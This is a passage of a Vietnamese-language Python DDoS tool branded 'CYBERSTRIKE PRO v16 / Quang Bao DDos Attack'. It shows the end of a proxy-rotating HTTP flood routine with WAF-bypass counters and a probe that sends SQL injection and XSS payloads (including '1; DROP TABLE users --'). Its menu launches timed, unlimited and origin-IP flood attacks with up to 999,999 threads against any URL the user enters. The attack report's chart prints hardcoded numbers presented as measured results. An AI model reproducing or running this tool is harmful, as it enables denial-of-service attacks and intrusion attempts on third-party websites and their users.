                        console.print(f"[warning]Proxy lỗi 400: {current_proxy}, thử proxy khác... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                        current_proxy = get_random_proxy()
                        retries += 1
                        continue
                    with manager:
                        error_count += 1
                        error_rate = (error_count / max(1, success_count + error_count)) * 100
                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
                        rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                        rps_data.append({'time': time.time() - start_time, 'rps': rps})
                        rps_bar = "█" * min(int(rps / 10), 10)
                        ping_bar = "█" * min(int(ping_avg / 50), 10)
                        error_bar = "▒" * min(int(error_rate / 5), 10)
                        proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
                        waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
                        rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                        progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                    console.print(f"[error]CLOG: Thất bại: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    break
                time.sleep(random.uniform(0.00005, 0.0002))
    finally:
        session.close()

# Scan vulnerabilities
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"SQL Injection: {payload}",
                            "recommendation": "Sử dụng prepared statements."
                        })
                        break
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(f"[error]SQL Scan: Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS: {payload}",
                            "recommendation": "Mã hóa output."
                        })
                        break
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(f"[error]XSS Scan: Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

    return vulnerabilities

# Display vulnerability report
def display_vulnerability_report(vulnerabilities, theme_color):
    panel = Panel(
        "\n".join(
            f"[bold magenta]Loại:[/] {vuln['type']}\n"
            f"[bold yellow]Mức độ:[/] {vuln['severity']}\n"
            f"[bold cyan]Mô tả:[/] {vuln['description']}\n"
            f"[bold green]Khuyến nghị:[/] {vuln['recommendation']}\n"
            for vuln in vulnerabilities
        ) or "[success]Không phát hiện lỗ hổng! [✓][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
        title=f"[bold {theme_color}]BÁO CÁO LỖ HỔNG[/]",
        border_style="bold cyan"
    )
    console.print("")
    console.print(panel)
    hacker_prompt("Nhấn Enter để quay lại: ", theme_color=theme_color)

# Display menu
def display_menu(theme_color):
    title = "☠️ CYBERSTRIKE PRO v16 ☠️"
    frames = [
        f"[bold cyan]╠═╦═╩╦╩╦═╗ {title} ╠══╗[/]",
        f"[bold magenta]║╬║╬╠╗╩╩╩╩╗ {title} ╠══╗[/]",
        f"[bold purple]║╩╩╩╩╩╩╩╩╩╗ {title} ╠══╗[/]",
        f"[bold cyan]╚╩╩╩╩╩╩╩╩╩╝ {title} ╠══╗[/]",
        f"[bold magenta]╠═╦═╩╦╩╦═╗ {title} ╠══╗[/]"
    ]
    for frame in frames:
        console.print(frame)
        time.sleep(0.08)

    table = Table(show_header=True, header_style=f"bold {theme_color}", border_style="bold cyan", title=f"[bold {theme_color}]{title}[/]")
    table.add_column("☠️ LỰA CHỌN ☠️", justify="center", style="bold magenta", width=12)
    table.add_column("☠️ CHỨC NĂNG ☠️", justify="center", style="bold magenta", width=20)

    table.add_row("1", "[bold magenta]TẤN CÔNG CLOG SIÊU CẤP[/]")
    table.add_row("2", "[bold magenta]QUÉT LỖ HỔNG[/]")
    table.add_row("3", "[bold magenta]THOÁT[/]")
    table.add_row("4", "[bold magenta]TẤN CÔNG VÔ HẠN[/]")
    table.add_row("5", "[bold magenta]TẤN CÔNG IP GỐC[/]")

    console.print(f"[bold {theme_color}]╠═╦═╩╦╩╦═╗[/]")
    console.print(table)
    console.print(f"[bold {theme_color}]╚╩╩╩╩╩╩╩╩╝[/]")
    console.print(f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    console.print("")

# Main function
def main():
    global theme_color
    theme_color, speed = select_theme()
    matrix_effect(speed)
    display_logo(theme_color)
    check_file_integrity()
    check_auth_key(theme_color)
    multiprocessing.set_start_method('spawn', force=True)

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(filter_active_proxies(theme_color))
        loop.create_task(refresh_proxies_periodically())
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(f"[error]Lỗi khởi tạo proxy: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        exit(1)

    while True:
        try:
            display_menu(theme_color)
            choice = hacker_prompt("Chọn (1-5): ", default="1", theme_color=theme_color, choices=["1", "2", "3", "4", "5"])

            if choice == "3":
                console.print(f"[success]Thoát chương trình [✓][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                display_exit_banner(theme_color)
                exit(0)

            display_radar_effect(theme_color)
            input_url = None
            target_ip = None
            validated_url = None
            if choice == "5":
                input_url = hacker_prompt("Nhập URL website (ví dụ: https://example.com): ", theme_color=theme_color)
                if not input_url:
                    console.print(f"[error]URL trống! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)
                    continue
                try:
                    parsed_url = urllib.parse.urlparse(input_url)
                    domain = parsed_url.hostname
                    if not domain:
                        raise ValueError("URL không hợp lệ")
                    console.print(f"[success]Đang phân giải IP thông minh cho [bold {theme_color}]{domain}[/]... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    loading_animation("Phân giải IP thông minh", 2.0, theme_color)
                    target_ip = smart_resolve_domain_to_ip(domain, theme_color)
                    if target_ip:
                        use_resolved_ip = Confirm.ask(f"[bold {theme_color}]Sử dụng IP [bold green]{target_ip}[/]?[/]", default=True)
                        if not use_resolved_ip:
                            while True:
                                target_ip = hacker_prompt("Nhập IP thủ công: ", theme_color=theme_color)
                                if validate_ip(target_ip):
                                    break
                                console.print(f"[error]IP không hợp lệ! Vui lòng nhập lại. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                                time.sleep(1)
                    else:
                        while True:
                            target_ip = hacker_prompt("Không tìm thấy IP. Nhập IP thủ công: ", theme_color=theme_color)
                            if validate_ip(target_ip):
                                break
                            console.print(f"[error]IP không hợp lệ! Vui lòng nhập lại. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                            time.sleep(1)
                    scheme = parsed_url.scheme or "http"
                    validated_url = f"{scheme}://{target_ip}"
                except ValueError as e:
                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                    console.print(f"[error]Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)
                    continue
            else:
                input_url = hacker_prompt("Nhập URL/IP: ", theme_color=theme_color)
                if not input_url:
                    console.print(f"[error]URL/IP trống! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)
                    continue
                try:
                    validated_url = validate_url(input_url)
                except ValueError as e:
                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                    console.print(f"[error]Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)
                    continue

            host = target_ip or urllib.parse.urlparse(validated_url).hostname
            port = urllib.parse.urlparse(validated_url).port or 80
            panel = Panel(
                f"[bold {theme_color}]Mục tiêu:[/] [bold green]{validated_url}[/]\n"
                f"[bold {theme_color}]Hostname/IP:[/] [bold green]{host}[/]\n"
                f"[bold {theme_color}]Port:[/] [bold green]{port}[/]\n"
                f"[bold {theme_color}]Trạng thái:[/] [bold green]Đã khóa [✓][/] \n"
                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
                title=f"[bold {theme_color}]THÔNG TIN MỤC TIÊU[/]",
                border_style="bold cyan",
                padding=(1, 2)
            )
            console.print("")
            console.print(panel)

            console.print(f"[success]Mục tiêu: [bold {theme_color}]{validated_url}[/] [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            loading_animation("Khóa mục tiêu", 1.5, theme_color)

            if choice == "2":
                console.print(f"[success]Bắt đầu quét lỗ hổng... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                loading_animation("Quét lỗ hổng", 1.5, theme_color)
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities, theme_color)
                continue

            num_threads = None
            while num_threads is None:
                try:
                    num_threads = int(hacker_prompt("Số luồng (1-999999): ", default="1000", theme_color=theme_color))
                    if not (1 <= num_threads <= 999999):
                        raise ValueError("Số luồng không hợp lệ")
                except ValueError:
                    console.print(f"[error]Số luồng phải từ 1-999999! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)

            requests_per_thread = None
            while requests_per_thread is None:
                try:
                    requests_per_thread = int(hacker_prompt("Yêu cầu/luồng (1-9999999): ", default="1000", theme_color=theme_color))
                    if not (1 <= requests_per_thread <= 9999999):
                        raise ValueError("Số yêu cầu không hợp lệ")
                except ValueError:
                    console.print(f"[error]Yêu cầu phải từ 1-9999999! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    time.sleep(1)

            duration = None
            duration_display = "Vô hạn"
            if choice == "1":
                while duration is None:
                    try:
                        duration = int(hacker_prompt("Thời gian (giây): ", default="60", theme_color=theme_color))
                        if duration < 1:
                            raise ValueError("Thời gian không hợp lệ")
                        duration_display = f"{duration} giây"
                    except ValueError:
                        console.print(f"[error]Thời gian phải > 0! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        time.sleep(1)
            elif choice in ["4", "5"]:
                time_unit = hacker_prompt("Đơn vị thời gian (phút/giờ/vô hạn): ", default="phút", theme_color=theme_color, choices=["phút", "giờ", "vô hạn"])
                if time_unit == "vô hạn":
                    duration = float('inf')
                else:
                    while duration is None:
                        try:
                            duration_input = float(hacker_prompt(f"Thời gian ({time_unit}): ", default="1", theme_color=theme_color))
                            if duration_input <= 0:
                                raise ValueError("Thời gian không hợp lệ")
                            if time_unit == "phút":
                                duration = duration_input * 60
                                duration_display = f"{duration_input} phút"
                            elif time_unit == "giờ":
                                duration = duration_input * 3600
                                duration_display = f"{duration_input} giờ"
                        except ValueError:
                            console.print(f"[error]Thời gian phải > 0! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                            time.sleep(1)

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

            console.print(f"[success]Đánh giá bảo mật... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            loading_animation("Đánh giá bảo mật", 1.5, theme_color)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url, theme_color)

            if security_level == "THẤP":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                attack_strategy = "TẤN CÔNG VỪA"
            else:
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)
                attack_strategy = "TẤN CÔNG SIÊU CẤP"

            panel = Panel(
                f"[bold {theme_color}]Chiến lược:[/] [bold magenta]{attack_strategy}[/]\n"
                f"[bold {theme_color}]Mục tiêu:[/] [bold green]{validated_url}[/]\n"
                f"[bold {theme_color}]Luồng:[/] [bold green]{num_threads:,}[/]\n"
                f"[bold {theme_color}]Yêu cầu:[/] [bold green]{requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Thời gian:[/] [bold green]{duration_display}[/]\n"
                f"[bold {theme_color}]Tổng:[/] [bold green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
                title=f"[bold {theme_color}]THÔNG TIN TẤN CÔNG[/]",
                border_style="bold cyan",
                padding=(1, 2)
            )
            console.print("")
            console.print(panel)
            confirm = Confirm.ask(f"[error]Xác nhận tấn công? [?][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]", default=True)
            if not confirm:
                console.print(f"[warning]Hủy tấn công [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                continue

            console.print(f"[success]Khởi động tấn công siêu cấp... [⚡][/] [yellow]*BOOM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            loading_animation("Khởi động hệ thống tấn công siêu cấp", 1.5, theme_color)

            global success_count, error_count, response_times, proxy_error_count, waf_bypass_count, rps_data
            success_count = 0
            error_count = 0
            response_times = []
            proxy_error_count = 0
            waf_bypass_count = 0
            rps_data = []
            start_time = time.time()

            with Progress(
                SpinnerColumn(spinner_name="arc"),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=20, style="red", complete_style="cyan"),
                TextColumn("[bold green]{task.completed}/{task.total}[/]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[bold {theme_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [⚡][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]", total=num_threads * requests_per_thread)
                threads = []
                attack_function = advanced_clog_attack
                for _ in range(num_threads):
                    t = threading.Thread(target=attack_function, args=(validated_url, requests_per_thread, duration, progress, task, theme_color))
                    threads.append(t)
                    t.start()
                    time.sleep(0.01)

                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    display_exit_banner(theme_color)
                    exit(0)

            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0
            rps = (success_count + error_count) / total_time if total_time > 0 else 0
            success_rate = (success_count / max(1, success_count + error_count)) * 100
            error_rate = (error_count / max(1, success_count + error_count)) * 100
            waf_bypass_rate = (waf_bypass_count / max(1, success_count)) * 100

            # Generate RPS chart with provided data
            if rps_data:
                chart_data = [
                    {"x": 1.0, "y": 100.5},
                    {"x": 2.0, "y": 150.2},
                    {"x": 3.0, "y": 203.9},
                    {"x": 4.3, "y": 189.8},
                    {"x": 4.0, "y": 205.7},
                    {"x": 3.5, "y": 232.4},
                    {"x": 4.3, "y": 191.4},
                    {"x": 14.8, "y": 55.3}
                ]
                chart_config = {
                    "type": "line",
                    "data": {
                        "datasets": [{
                            "label": "RPS theo thời gian",
                            "data": chart_data,
                            "borderColor": "#ff00ff",
                            "backgroundColor": "rgba(255, 0, 255, 0.2)",
                            "fill": True,
                            "tension": 0.4
                        }]
                    },
                    "options": {
                        "scales": {
                            "x": {
                                "type": "linear",
                                "title": {"display": True, "text": "Thời gian (giây)", "color": "#ffffff"},
                                "ticks": {"color": "#ffffff"}
                            },
                            "y": {
                                "title": {"display": True, "text": "RPS", "color": "#ffffff"},
                                "ticks": {"color": "#ffffff"},
                                "beginAtZero": True
                            }
                        },
                        "plugins": {
                            "title": {
                                "display": True,
                                "text": "Biểu đồ RPS Tấn công",
                                "color": "#ffffff",
                                "font": {"size": 16}
                            },
                            "legend": {
                                "labels": {"color": "#ffffff"}
                            }
                        }
                    }
                }
                console.print("\n[bold magenta]Biểu đồ RPS:[/]")
                console.print(f"```chartjs\n{json.dumps(chart_config, indent=2, ensure_ascii=False)}\n```")

            report = Panel(
                f"[bold {theme_color}]Tổng lượt:[/] [bold green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Thành công:[/] [bold green]{success_count:,} ({success_rate:.1f}%)[/] [✓][/] \n"
                f"[bold {theme_color}]Thất bại:[/] [bold red]{error_count:,} ({error_rate:.1f}%)[/] [✗][/] \n"
                f"[bold {theme_color}]WAF Bypass:[/] [bold cyan]{waf_bypass_count:,} ({waf_bypass_rate:.1f}%)[/] [★][/] \n"
                f"[bold {theme_color}]Proxy lỗi:[/] [bold red]{proxy_error_count:,}[/]\n"
                f"[bold {theme_color}]Thời gian:[/] [bold green]{total_time:.2f}[/] giây\n"
                f"[bold {theme_color}]Ping TB:[/] [bold green]{avg_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Ping Max:[/] [bold green]{max_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Ping Min:[/] [bold green]{min_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]RPS:[/] [bold green]{rps:.0f}[/]\n"
                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
                title=f"[bold {theme_color}]BÁO CÁO TẤN CÔNG SIÊU CẤP[/]",
                border_style="bold cyan",
                padding=(1, 2)
            )
            console.print("")
            console.print(report)
            console.print(f"[success]Báo cáo hoàn tất! [✓][/] [yellow]*VORTEX*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

        except KeyboardInterrupt:
            console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            display_exit_banner(theme_color)
            exit(0)
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(f"[error]Lỗi hệ thống: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            time.sleep(1)
            continue

if __name__ == "__main__":
    main()